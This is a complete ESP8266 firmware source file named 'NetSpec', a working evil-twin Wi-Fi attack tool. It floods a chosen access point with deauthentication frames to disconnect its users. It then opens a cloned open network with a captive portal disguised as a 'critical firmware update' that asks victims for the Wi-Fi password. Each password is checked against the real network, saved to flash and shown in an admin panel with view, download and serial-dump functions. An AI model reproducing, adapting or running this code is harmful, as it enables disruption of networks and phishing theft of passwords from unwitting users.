#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ArduinoJson.h>
#include <FS.h>

extern "C" {
#include "user_interface.h"
}

#define ADMIN_SSID "NetSpec-Admin"
#define ADMIN_PASS "SecureTest123"
#define DNS_PORT 53
#define WEB_PORT 80
#define ADMIN_PORT 8080
#define MAX_NETWORKS 16
#define MAX_CREDS 50
#define SCAN_INT 15000
#define DEAUTH_INT 1000

struct Network {
  String ssid;
  uint8_t bssid[6];
  uint8_t channel;
  int8_t rssi;
  Network() : ssid(""), channel(0), rssi(0) { memset(bssid, 0, 6); }
};

struct Credential {
  String ssid, bssid, password;
  unsigned long timestamp;
  Credential() : ssid(""), bssid(""), password(""), timestamp(0) {}
  Credential(String s, String b, String p, unsigned long t) : ssid(s), bssid(b), password(p), timestamp(t) {}
};

DNSServer dnsServer;
ESP8266WebServer webServer(WEB_PORT);
ESP8266WebServer adminServer(ADMIN_PORT);

Network networks[MAX_NETWORKS];
Network targetNet;
std::vector<Credential> credentials;
String lastPassword = "";

bool twinActive = false;
bool deauthActive = false;
unsigned long lastScan = 0;
unsigned long lastDeauth = 0;
unsigned long startMillis = 0;

String macToStr(const uint8_t* mac) {
  char buf[18];
  sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}

int rssiToQuality(int rssi) {
  if (rssi >= -50) return 4;
  if (rssi >= -60) return 3;
  if (rssi >= -70) return 2;
  if (rssi >= -80) return 1;
  return 0;
}

String formatTime(unsigned long ms) {
  unsigned long s = ms / 1000;
  unsigned long m = s / 60;
  unsigned long h = m / 60;
  char buf[32];
  sprintf(buf, "%luh %lum %lus", h, m % 60, s % 60);
  return String(buf);
}

void logToSerial(String ssid, String bssid, String password) {
  Serial.println("\n════════════════════════════════════════");
  Serial.println("         REAL-TIME CAPTURE LOG");
  Serial.println("════════════════════════════════════════");
  Serial.printf("Timestamp: %lu\n", millis());
  Serial.printf("SSID: %s\n", ssid.c_str());
  Serial.printf("Password: %s\n", password.c_str());
  Serial.printf("BSSID: %s\n", bssid.c_str());
  Serial.printf("Total Stored: %d/%d\n", credentials.size(), MAX_CREDS);
  Serial.println("════════════════════════════════════════\n");
}

void checkFileSystem() {
  Serial.println("\n=== FILE SYSTEM STATUS ===");
  
  if (!SPIFFS.begin()) {
    Serial.println("SPIFFS not mounted");
    return;
  }
  
  if (SPIFFS.exists("/credentials.json")) {
    File file = SPIFFS.open("/credentials.json", "r");
    if (file) {
      size_t size = file.size();
      Serial.printf("File: /credentials.json (%d bytes)\n", size);
      file.close();
    }
  } else {
    Serial.println("File not found: /credentials.json");
  }
  
  Serial.println("Files in SPIFFS:");
  Dir dir = SPIFFS.openDir("/");
  int fileCount = 0;
  while (dir.next()) {
    Serial.printf("  %s (%d bytes)\n", dir.fileName().c_str(), dir.fileSize());
    fileCount++;
  }
  if (fileCount == 0) Serial.println("  (empty)");
}

void scanWiFi() {
  int n = WiFi.scanNetworks();
  memset(networks, 0, sizeof(networks));
  
  for (int i = 0; i < n && i < MAX_NETWORKS; i++) {
    networks[i].ssid = WiFi.SSID(i);
    networks[i].channel = WiFi.channel(i);
    networks[i].rssi = WiFi.RSSI(i);
    memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
  }
  Serial.printf("Scan: %d networks\n", n);
}

bool saveToFileSystem() {
  Serial.println("\nSaving to SPIFFS...");
  
  if (credentials.empty()) {
    File file = SPIFFS.open("/credentials.json", "w");
    if (file) {
      file.print("[]");
      file.close();
      return true;
    }
    return false;
  }
  
  DynamicJsonDocument doc(4096);
  JsonArray arr = doc.to<JsonArray>();
  
  for (size_t i = 0; i < credentials.size(); i++) {
    JsonObject obj = arr.createNestedObject();
    obj["ssid"] = credentials[i].ssid;
    obj["bssid"] = credentials[i].bssid;
    obj["password"] = credentials[i].password;
    obj["timestamp"] = credentials[i].timestamp;
  }
  
  File file = SPIFFS.open("/credentials.json", "w");
  if (!file) {
    return false;
  }
  
  serializeJsonPretty(doc, file);
  file.close();
  
  delay(50);
  if (SPIFFS.exists("/credentials.json")) {
    File verify = SPIFFS.open("/credentials.json", "r");
    size_t size = verify.size();
    verify.close();
    return true;
  } else {
    return false;
  }
}

void addCredential(String ssid, String bssid, String pass) {
  Serial.println("\nAdding new credential...");
  
  for (size_t i = 0; i < credentials.size(); i++) {
    if (credentials[i].ssid == ssid && 
        credentials[i].bssid == bssid && 
        credentials[i].password == pass) {
      Serial.println("Duplicate credential, skipping");
      return;
    }
  }
  
  if (credentials.size() >= MAX_CREDS) {
    Serial.println("Max credentials reached, removing oldest");
    credentials.erase(credentials.begin());
  }
  
  Credential cred(ssid, bssid, pass, millis());
  credentials.push_back(cred);
  
  logToSerial(ssid, bssid, pass);
  
  Serial.println("Auto-saving to file...");
  if (saveToFileSystem()) {
    Serial.println("Saved to SPIFFS");
  } else {
    Serial.println("Save to file failed");
  }
}

void loadFromFileSystem() {
  Serial.println("\nLoading credentials from SPIFFS...");
  
  if (!SPIFFS.begin()) {
    Serial.println("SPIFFS mount failed");
    return;
  }
  
  if (!SPIFFS.exists("/credentials.json")) {
    File file = SPIFFS.open("/credentials.json", "w");
    if (file) {
      file.print("[]");
      file.close();
    }
    credentials.clear();
    return;
  }
  
  File file = SPIFFS.open("/credentials.json", "r");
  if (!file) {
    Serial.println("Cannot open file for reading");
    credentials.clear();
    return;
  }
  
  size_t size = file.size();
  
  if (size == 0) {
    file.close();
    credentials.clear();
    return;
  }
  
  String fileContent = file.readString();
  file.close();
  
  DynamicJsonDocument doc(4096);
  DeserializationError error = deserializeJson(doc, fileContent);
  
  if (error) {
    File fix = SPIFFS.open("/credentials.json", "w");
    if (fix) {
      fix.print("[]");
      fix.close();
    }
    credentials.clear();
    return;
  }
  
  credentials.clear();
  
  if (!doc.is<JsonArray>()) {
    credentials.clear();
    return;
  }
  
  JsonArray arr = doc.as<JsonArray>();
  
  for (JsonObject obj : arr) {
    if (obj.containsKey("ssid") && obj.containsKey("password")) {
      Credential cred;
      cred.ssid = obj["ssid"].as<String>();
      cred.bssid = obj["bssid"].as<String>();
      cred.password = obj["password"].as<String>();
      cred.timestamp = obj["timestamp"].as<unsigned long>();
      
      if (cred.ssid.length() > 0 && cred.password.length() > 0) {
        credentials.push_back(cred);
      }
    }
  }
  
  Serial.printf("Loaded %d credentials\n", credentials.size());
}

void clearFileSystem() {
  Serial.println("\nClearing all credentials...");
  
  credentials.clear();
  
  if (!SPIFFS.begin()) {
    Serial.println("SPIFFS not mounted");
    return;
  }
  
  if (SPIFFS.exists("/credentials.json")) {
    SPIFFS.remove("/credentials.json");
  }
  
  File file = SPIFFS.open("/credentials.json", "w");
  if (file) {
    file.print("[]");
    file.close();
  }
}

void dumpFileContent() {
  Serial.println("\n=== FILE CONTENT DUMP ===");
  
  if (!SPIFFS.begin()) {
    Serial.println("SPIFFS not mounted");
    return;
  }
  
  if (SPIFFS.exists("/credentials.json")) {
    File file = SPIFFS.open("/credentials.json", "r");
    if (file) {
      Serial.println("File content:");
      Serial.println("----------------------------------------");
      while (file.available()) {
        Serial.write(file.read());
      }
      Serial.println("\n----------------------------------------");
      file.close();
    }
  } else {
    Serial.println("File not found");
  }
}

void sendDeauth() {
  if (!deauthActive || targetNet.ssid.isEmpty()) return;
  
  wifi_set_channel(targetNet.channel);
  uint8_t packet[26] = {
    0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x00
  };
  
  memcpy(&packet[10], targetNet.bssid, 6);
  memcpy(&packet[16], targetNet.bssid, 6);
  
  wifi_send_pkt_freedom(packet, 26, 0);
  packet[0] = 0xA0;
  wifi_send_pkt_freedom(packet, 26, 0);
}

void startTwin() {
  if (targetNet.ssid.isEmpty()) return;
  
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  delay(100);
  
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
  WiFi.softAP(targetNet.ssid.c_str());
  dnsServer.start(DNS_PORT, "*", IPAddress(192,168,4,1));
  
  twinActive = true;
  Serial.printf("Twin AP: %s\n", targetNet.ssid.c_str());
}

void stopTwin() {
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  delay(100);
  
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
  WiFi.softAP(ADMIN_SSID, ADMIN_PASS);
  dnsServer.start(DNS_PORT, "*", IPAddress(192,168,4,1));
  
  twinActive = false;
  Serial.println("Twin stopped");
}

const char PORTAL_EN[] PROGMEM = R"(
<!DOCTYPE html><html><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1">
<title>Security Update</title><style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:monospace;background:#0a0a0a;color:#0f0;padding:20px}
.container{max-width:500px;margin:auto;border:2px solid #0f0;padding:20px;box-shadow:0 0 20px #0f0}
.header{text-align:center;margin-bottom:20px;border-bottom:1px solid #0f0;padding-bottom:15px}
h1{color:#0f0;font-size:24px;text-shadow:0 0 10px #0f0}
.alert{background:#1a1a1a;border:1px solid #ff0;padding:15px;margin-bottom:20px;color:#ff0}
.form-group{margin-bottom:20px}
label{display:block;color:#0f0;margin-bottom:8px;font-size:14px}
input{width:100%;padding:12px;background:#1a1a1a;border:1px solid #0f0;color:#0f0;font-family:monospace}
button{width:100%;padding:15px;background:#0a0a0a;border:2px solid #0f0;color:#0f0;font-size:16px;cursor:pointer;font-family:monospace}
button:hover{background:#0f0;color:#000;box-shadow:0 0 15px #0f0}
.footer{text-align:center;margin-top:20px;font-size:12px;color:#555}
</style></head>
<body><div class=container>
<div class=header><h1>⚡ SYSTEM UPDATE</h1><p style=color:#aaa>Critical firmware patch required</p></div>
<div class=alert>⚠ SECURITY ALERT: Router vulnerable to attacks. Update immediately.</div>
<form method=POST>
<div class=form-group><label>WiFi Password:</label>
<input type=password name=password required placeholder="Enter network key"></div>
<button type=submit>⏳ INSTALL UPDATE</button>
</form>
<div class=footer>Security Patch v8.00 | Do not disconnect</div>
</div></body></html>
)";

const char PORTAL_LOAD[] PROGMEM = R"(
<!DOCTYPE html><html><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1">
<meta http-equiv=refresh content="10;url=/result">
<title>Updating</title><style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:monospace;background:#000;color:#0f0;display:flex;align-items:center;justify-content:center;min-height:100vh}
.container{text-align:center}
.scanline{width:300px;height:2px;background:#0f0;margin:30px auto;animation:scan 2s infinite}
@keyframes scan{0%{transform:translateY(-20px);opacity:0}50%{opacity:1}100%{transform:translateY(20px);opacity:0}}
.terminal{background:#111;border:1px solid #0f0;padding:20px;font-family:'Courier New',monospace}
.blink{animation:blink 1s infinite}
@keyframes blink{50%{opacity:0}}
</style></head>
<body>
<div class=container>
<div class=terminal>
<span style=color:#0f0>>_ SYSTEM_UPDATE.EXE</span><br>
<span style=color:#ff0>[■□□□□□□□□□] 10%</span><br>
<span style=color:#0ff>Patching kernel modules...</span><br>
<span style=color:#f0f>Applying security fixes...</span><br>
<span class=blink style=color:#0f0>█</span>
</div>
<div class=scanline></div>
<div style=color:#aaa;margin-top:20px>DO NOT POWER OFF</div>
</div></body></html>
)";

void handlePortalSubmit() {
  if (!webServer.hasArg("password")) {
    webServer.send(400, "text/html", "Error");
    return;
  }
  
  lastPassword = webServer.arg("password");
  WiFi.disconnect();
  WiFi.begin(targetNet.ssid.c_str(), lastPassword.c_str(), targetNet.channel, targetNet.bssid);
  webServer.send_P(200, "text/html", PORTAL_LOAD);
}

void handleResult() {
  if (WiFi.status() != WL_CONNECTED) {
    addCredential(targetNet.ssid, macToStr(targetNet.bssid), lastPassword);
    
    webServer.send(200, "text/html",
      "<!DOCTYPE html><html><head><meta name=viewport content='width=device-width,initial-scale=1'></head>"
      "<body style='background:#000;color:#f00;font-family:monospace;text-align:center;padding:50px'>"
      "<div style='border:2px solid #f00;padding:30px;display:inline-block'>"
      "<h1 style='color:#f00'>✗ AUTH FAILED</h1>"
      "<p>Invalid credentials</p>"
      "<p style='color:#aaa;margin-top:20px'>Retrying...</p>"
      "</div></body></html>"
    );
  } else {
    addCredential(targetNet.ssid, macToStr(targetNet.bssid), lastPassword);
    
    webServer.send(200, "text/html",
      "<!DOCTYPE html><html><head><meta name=viewport content='width=device-width,initial-scale=1'></head>"
      "<body style='background:#000;color:#0f0;font-family:monospace;text-align:center;padding:50px'>"
      "<div style='border:2px solid #0f0;padding:30px;display:inline-block;box-shadow:0 0 30px #0f0'>"
      "<h1 style='color:#0f0;font-size:40px'>✓ SUCCESS</h1>"
      "<p>Update completed</p>"
      "<p style='color:#0f0;font-size:12px;margin-top:20px'>System secure</p>"
      "</div></body></html>"
    );
  }
}

void handlePortal() {
  if (twinActive && !targetNet.ssid.isEmpty()) {
    if (webServer.hasArg("password")) {
      handlePortalSubmit();
    } else {
      webServer.send_P(200, "text/html", PORTAL_EN);
    }
  } else {
    webServer.send(404, "text/html", "404");
  }
}

void handleNetworksUpdate() {
  String html = "";
  bool hasNet = false;
  
  for (int i = 0; i < MAX_NETWORKS && !networks[i].ssid.isEmpty(); i++) {
    hasNet = true;
    bool sel = (macToStr(networks[i].bssid) == macToStr(targetNet.bssid));
    int q = rssiToQuality(networks[i].rssi);
    
    String bars = "<div class=signal>";
    for (int j = 0; j < 5; j++) bars += "<div class='bar " + String(j<q?"on":"") + "' style='height:" + String(5+j*2) + "px'></div>";
    bars += "</div>";
    
    html += "<div class='net" + String(sel?" sel":"") + "' onclick='select(\"" + macToStr(networks[i].bssid) + "\")'>";
    html += "<div style='display:flex;justify-content:space-between'>";
    html += "<strong>" + networks[i].ssid + "</strong>" + bars + "</div>";
    html += "<div style='color:#aaa;font-size:11px'>CH:" + String(networks[i].channel) + " | " + String(networks[i].rssi) + "dBm | " + macToStr(networks[i].bssid) + "</div>";
    html += "</div>";
  }
  if (!hasNet) html = "<div style=color:#666;text-align:center;padding:20px>NO NETWORKS FOUND</div>";
  
  adminServer.send(200, "text/html", html);
}

void handleFileDownload() {
  if (!SPIFFS.begin()) {
    adminServer.send(500, "text/plain", "SPIFFS not mounted");
    return;
  }
  
  if (!SPIFFS.exists("/credentials.json")) {
    adminServer.send(404, "text/plain", "File not found");
    return;
  }
  
  File file = SPIFFS.open("/credentials.json", "r");
  if (!file) {
    adminServer.send(500, "text/plain", "Cannot open file");
    return;
  }
  
  adminServer.sendHeader("Content-Type", "application/json");
  adminServer.sendHeader("Content-Disposition", "attachment; filename=credentials.json");
  adminServer.streamFile(file, "application/json");
  file.close();
}

void handleFileView() {
  String html = "<!DOCTYPE html><html><head><meta charset=UTF-8>";
  html += "<title>Credentials File</title><style>";
  html += "body{font-family:'Courier New',monospace;background:#0a0a0a;color:#0f0;padding:20px}";
  html += ".container{max-width:1000px;margin:auto}";
  html += "pre{background:#111;padding:15px;border:1px solid #0f0;overflow:auto;max-height:500px}";
  html += ".btn{display:inline-block;padding:8px 12px;margin:2px;background:#1a1a1a;border:1px solid #0f0;color:#0f0;text-decoration:none;font-size:12px}";
  html += ".btn:hover{background:#0f0;color:#000}";
  html += ".btn-small{padding:4px 8px;font-size:10px;margin:1px}";
  html += "</style></head><body><div class=container>";
  html += "<h2>credentials.json</h2>";
  
  if (SPIFFS.begin() && SPIFFS.exists("/credentials.json")) {
    File file = SPIFFS.open("/credentials.json", "r");
    if (file) {
      html += "<pre>";
      while (file.available()) {
        html += (char)file.read();
      }
      html += "</pre>";
      file.close();
      html += "<p>File size: " + String(file.size()) + " bytes</p>";
    }
  } else {
    html += "<p>File not found</p>";
  }
  
  html += "<p>";
  html += "<a class='btn btn-small' href='/download'>Download JSON</a> ";
  html += "<a class='btn btn-small' href='/admin'>Back to Admin</a>";
  html += "</p>";
  html += "</div></body></html>";
  
  adminServer.send(200, "text/html", html);
}

void handleAdmin() {
  String html = "<!DOCTYPE html><html><head><meta charset=UTF-8><meta name=viewport content='width=device-width,initial-scale=1'>";
  html += "<title>NetSpec</title><style>";
  html += "*{margin:0;padding:0;box-sizing:border-box}";
  html += "body{font-family:'Courier New',monospace;background:#0a0a0a;color:#0f0;padding:15px}";
  html += ".term{max-width:1200px;margin:auto}";
  html += ".header{border-bottom:2px solid #0f0;padding-bottom:15px;margin-bottom:20px}";
  html += ".title{font-size:24px;color:#0f0;text-shadow:0 0 10px #0f0;margin-bottom:5px}";
  html += ".sub{color:#aaa;font-size:12px;margin-bottom:10px}";
  html += ".badge{display:inline-block;padding:4px 8px;margin:2px;border:1px solid;font-size:11px}";
  html += ".badge.on{background:#0f0;color:#000;border-color:#0f0}";
  html += ".badge.off{background:#333;color:#666;border-color:#444}";
  html += ".panel{background:#111;border:1px solid #333;padding:15px;margin-bottom:15px}";
  html += "h2{color:#0f0;margin-bottom:10px;font-size:16px}";
  html += ".btn{display:inline-block;padding:8px 12px;margin:2px;background:#1a1a1a;border:1px solid #0f0;color:#0f0;cursor:pointer;text-decoration:none;font-size:12px}";
  html += ".btn:hover{background:#0f0;color:#000}";
  html += ".btn-small{padding:4px 8px;font-size:10px;margin:1px}";
  html += ".grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:10px;margin-bottom:15px}";
  html += ".net{background:#1a1a1a;border:1px solid #333;padding:10px;margin-bottom:8px;cursor:pointer}";
  html += ".net:hover{border-color:#0f0}";
  html += ".net.sel{border-color:#0f0;background:#1a2a1a}";
  html += ".cred{background:#1a1a1a;border:1px solid #0f0;padding:15px;margin-bottom:10px}";
  html += ".pass{font-family:monospace;background:#000;padding:10px;margin:10px 0;border:1px solid #333;color:#0f0}";
  html += ".signal{display:flex;gap:2px;align-items:flex-end;height:15px}";
  html += ".bar{width:4px;background:#333}";
  html += ".bar.on{background:#0f0}";
  html += "input{width:100%;padding:10px;background:#1a1a1a;border:1px solid #333;color:#0f0;margin-bottom:10px}";
  html += "</style></head><body><div class=term>";
  
  html += "<div class=header><div class=title>NetSpec</div>";
  html += "<div class=sub>192.168.4.1:8080 | Uptime: " + formatTime(millis() - startMillis) + "</div>";
  html += "<span class='badge " + String(deauthActive?"on":"off") + "' id=deauthBadge>" + String(deauthActive?"DEAUTH ON":"DEAUTH OFF") + "</span>";
  html += "<span class='badge " + String(twinActive?"on":"off") + "' id=twinBadge>" + String(twinActive?"TWIN AP ON":"TWIN AP OFF") + "</span>";
  html += "<span class='badge on' id=credBadge>CREDS: " + String(credentials.size()) + "</span>";
  html += "<a class='btn btn-small' href='/view' style='float:right'>View</a>";
  html += "<a class='btn btn-small' href='/download' style='float:right;margin-right:5px'>Download</a>";
  html += "</div>";
  
  html += "<div class=panel><h2>CONTROLS</h2><div class=grid>";
  html += "<a class=btn onclick='scan()'>SCAN</a>";
  html += "<a class=btn onclick='toggleDeauth()'>" + String(deauthActive?"STOP":"START") + " DEAUTH</a>";
  html += "<a class=btn onclick='toggleTwin()'>" + String(twinActive?"STOP":"START") + " TWIN</a>";
  html += "<a class=btn onclick='clearCreds()'>CLEAR ALL</a>";
  html += "</div></div>";
  
  html += "<div class=panel><h2>NETWORKS</h2>";
  html += "<input type=text id=customSSID placeholder='Custom SSID' maxlength=32>";
  html += "<a class=btn onclick='useCustom()' style='display:block;text-align:center'>USE CUSTOM</a><br>";
  html += "<div id=networksContainer>";
  
  bool hasNet = false;
  for (int i = 0; i < MAX_NETWORKS && !networks[i].ssid.isEmpty(); i++) {
    hasNet = true;
    bool sel = (macToStr(networks[i].bssid) == macToStr(targetNet.bssid));
    int q = rssiToQuality(networks[i].rssi);
    
    String bars = "<div class=signal>";
    for (int j = 0; j < 5; j++) bars += "<div class='bar " + String(j<q?"on":"") + "' style='height:" + String(5+j*2) + "px'></div>";
    bars += "</div>";
    
    html += "<div class='net" + String(sel?" sel":"") + "' onclick='select(\"" + macToStr(networks[i].bssid) + "\")'>";
    html += "<div style='display:flex;justify-content:space-between'>";
    html += "<strong>" + networks[i].ssid + "</strong>" + bars + "</div>";
    html += "<div style='color:#aaa;font-size:11px'>CH:" + String(networks[i].channel) + " | " + String(networks[i].rssi) + "dBm | " + macToStr(networks[i].bssid) + "</div>";
    html += "</div>";
  }
  if (!hasNet) html += "<div style=color:#666;text-align:center;padding:20px>NO NETWORKS FOUND</div>";
  html += "</div></div>";
  
  html += "<div class=panel><h2>CAPTURED";
  if (credentials.size() > 0) html += " [" + String(credentials.size()) + "/" + String(MAX_CREDS) + "]";
  html += "</h2>";
  html += "<div id=credentialsContainer>";
  
  if (credentials.empty()) {
    html += "<div style=color:#666;text-align:center;padding:20px>NO CREDENTIALS</div>";
  } else {
    for (int i = credentials.size() - 1; i >= 0; i--) {
      html += "<div class=cred>";
      html += "<div style='color:#0f0;font-size:14px;margin-bottom:5px'>" + credentials[i].ssid + "</div>";
      html += "<div class=pass>" + credentials[i].password + "</div>";
      html += "<div style='color:#666;font-size:11px'>" + credentials[i].bssid + " | " + formatTime(millis() - credentials[i].timestamp) + " ago</div>";
      html += "</div>";
    }
  }
  html += "</div></div>";
  
  html += "<script>";
  html += "let scanInProgress = false;";
  html += "function scan(){if(!scanInProgress){scanInProgress=true;fetch('/api/scan',{method:'POST'}).then(()=>{setTimeout(()=>{updateNetworks();scanInProgress=false},2000)})}}";
  html += "function toggleDeauth(){fetch('/api/deauth/toggle',{method:'POST'}).then(r=>r.json()).then(data=>{document.getElementById('deauthBadge').className='badge '+(data.deauth?'on':'off');document.getElementById('deauthBadge').textContent=data.deauth?'DEAUTH ON':'DEAUTH OFF'})}";
  html += "function toggleTwin(){fetch('/api/twin/toggle',{method:'POST'}).then(r=>r.json()).then(data=>{document.getElementById('twinBadge').className='badge '+(data.twin?'on':'off');document.getElementById('twinBadge').textContent=data.twin?'TWIN AP ON':'TWIN AP OFF'})}";
  html += "function clearCreds(){if(confirm('Clear all credentials?'))fetch('/api/creds/clear',{method:'POST'}).then(()=>{document.getElementById('credBadge').textContent='CREDS: 0';document.getElementById('credentialsContainer').innerHTML='<div style=color:#666;text-align:center;padding:20px>NO CREDENTIALS</div>'})}";
  html += "function select(bssid){fetch('/api/select',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({bssid:bssid})}).then(()=>updateNetworks())}";
  html += "function useCustom(){let s=document.getElementById('customSSID').value.trim();if(s.length>0&&s.length<=32)fetch('/api/select',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({bssid:'custom',ssid:s})}).then(()=>updateNetworks())}";
  html += "function updateNetworks(){fetch('/update/networks').then(r=>r.text()).then(html=>{document.getElementById('networksContainer').innerHTML=html})}";
  html += "setInterval(updateNetworks,3000);";
  html += "</script></div></body></html>";
  
  adminServer.send(200, "text/html", html);
}

void setup() {
  Serial.begin(115200);
  
  unsigned long startWait = millis();
  while (!Serial && (millis() - startWait < 5000)) {
    delay(10);
  }
  
  while (Serial.available()) {
    Serial.read();
  }
  
  delay(1000);
  
  Serial.println("\n\n\n\n");
  Serial.println("════════════════════════════════════════");
  Serial.println("                NetSpec");
  Serial.println("════════════════════════════════════════\n");
  
  startMillis = millis();
  
  Serial.println("Initializing SPIFFS...");
  delay(500);
  
  bool fsOk = false;
  for (int i = 0; i < 3; i++) {
    if (SPIFFS.begin()) {
      fsOk = true;
      break;
    }
    delay(1000);
  }
  
  loadFromFileSystem();
  
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
  WiFi.softAP(ADMIN_SSID, ADMIN_PASS);
  dnsServer.start(DNS_PORT, "*", IPAddress(192,168,4,1));
  
  adminServer.on("/api/scan", HTTP_POST, []() { 
    scanWiFi(); 
    adminServer.send(200, "application/json", "{\"ok\":true}"); 
  });
  
  adminServer.on("/api/deauth/toggle", HTTP_POST, []() { 
    deauthActive = !deauthActive; 
    DynamicJsonDocument doc(128);
    doc["deauth"] = deauthActive;
    String resp;
    serializeJson(doc, resp);
    adminServer.send(200, "application/json", resp); 
  });
  
  adminServer.on("/api/twin/toggle", HTTP_POST, []() { 
    twinActive ? stopTwin() : startTwin(); 
    DynamicJsonDocument doc(128);
    doc["twin"] = twinActive;
    String resp;
    serializeJson(doc, resp);
    adminServer.send(200, "application/json", resp); 
  });
  
  adminServer.on("/api/select", HTTP_POST, []() {
    StaticJsonDocument<256> doc;
    deserializeJson(doc, adminServer.arg("plain"));
    String bssid = doc["bssid"].as<String>();
    
    if (bssid == "custom") {
      String custom = doc["ssid"].as<String>();
      if (custom.length() > 0 && custom.length() <= 32) {
        targetNet.ssid = custom;
        targetNet.channel = 1;
        for (int i = 0; i < 6; i++) targetNet.bssid[i] = random(256);
        adminServer.send(200, "application/json", "{\"ok\":true}");
        return;
      }
    }
    
    for (int i = 0; i < MAX_NETWORKS; i++) {
      if (macToStr(networks[i].bssid) == bssid) {
        targetNet = networks[i];
        adminServer.send(200, "application/json", "{\"ok\":true}");
        return;
      }
    }
    
    adminServer.send(404, "application/json", "{\"error\":\"Not found\"}");
  });
  
  adminServer.on("/api/creds/clear", HTTP_POST, []() { 
    clearFileSystem(); 
    adminServer.send(200, "application/json", "{\"ok\":true}"); 
  });
  
  adminServer.on("/download", handleFileDownload);
  adminServer.on("/view", handleFileView);
  adminServer.on("/update/networks", handleNetworksUpdate);
  adminServer.on("/admin", handleAdmin);
  adminServer.on("/", handleAdmin);
  
  webServer.on("/result", handleResult);
  webServer.onNotFound(handlePortal);
  
  webServer.begin();
  adminServer.begin();
  
  Serial.println("AP: " + String(ADMIN_SSID));
  Serial.println("Pass: " + String(ADMIN_PASS));
  Serial.println("Admin: http://192.168.4.1:8080");
  Serial.println("File View: http://192.168.4.1:8080/view");
  Serial.println("Download: http://192.168.4.1:8080/download");
  Serial.println("Storage: SPIFFS");
  Serial.println("\nSerial Commands:");
  Serial.println("  d - Dump all credentials");
  Serial.println("  f - Check filesystem");
  Serial.println("  s - Manual save to file");
  Serial.println("  l - Show file content");
  Serial.println("  c - Clear all data");
  Serial.println("  t - Test SPIFFS");
  Serial.println("\nSet Serial Monitor to 115200 baud");
  Serial.println("════════════════════════════════════════\n");
  
  scanWiFi();
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  adminServer.handleClient();
  
  if (deauthActive && millis() - lastDeauth >= DEAUTH_INT) {
    sendDeauth();
    lastDeauth = millis();
  }
  
  if (millis() - lastScan >= SCAN_INT && !twinActive) {
    scanWiFi();
    lastScan = millis();
  }
  
  if (Serial.available()) {
    char cmd = Serial.read();
    
    if (cmd == 'd' || cmd == 'D') {
      Serial.println("\n=== DUMP ALL CREDENTIALS ===");
      if (credentials.size() > 0) {
        for (size_t i = 0; i < credentials.size(); i++) {
          Serial.printf("\n[%d] SSID: %s\n", i+1, credentials[i].ssid.c_str());
          Serial.printf("    Pass: %s\n", credentials[i].password.c_str());
          Serial.printf("    BSSID: %s\n", credentials[i].bssid.c_str());
          Serial.printf("    Time: %s ago\n", formatTime(millis() - credentials[i].timestamp).c_str());
        }
        Serial.printf("\nTotal: %d credentials\n", credentials.size());
      } else {
        Serial.println("No credentials stored");
      }
    }
    
    else if (cmd == 'f' || cmd == 'F') {
      checkFileSystem();
    }
    
    else if (cmd == 's' || cmd == 'S') {
      Serial.println("Manual save...");
      if (saveToFileSystem()) {
        Serial.println("Saved to SPIFFS");
      } else {
        Serial.println("Save failed");
      }
    }
    
    else if (cmd == 'l' || cmd == 'L') {
      dumpFileContent();
    }
    
    else if (cmd == 'c' || cmd == 'C') {
      Serial.println("Clearing all data...");
      clearFileSystem();
      Serial.println("All data cleared");
    }
    
    else if (cmd == 't' || cmd == 'T') {
      Serial.println("\n=== TEST SPIFFS ===");
      if (SPIFFS.begin()) {
        Serial.println("SPIFFS mounted");
        
        File test = SPIFFS.open("/test.txt", "w");
        if (test) {
          test.print("SPIFFS Test at " + String(millis()));
          test.close();
          Serial.println("Test file written");
        }
        
        if (SPIFFS.exists("/test.txt")) {
          File read = SPIFFS.open("/test.txt", "r");
          Serial.println("Test content: " + read.readString());
          read.close();
        }
        
        if (SPIFFS.exists("/credentials.json")) {
          File creds = SPIFFS.open("/credentials.json", "r");
          size_t size = creds.size();
          creds.close();
          Serial.printf("credentials.json exists (%d bytes)\n", size);
        } else {
          Serial.println("credentials.json does NOT exist");
        }
      } else {
        Serial.println("SPIFFS not mounted");
      }
    }
  }
}
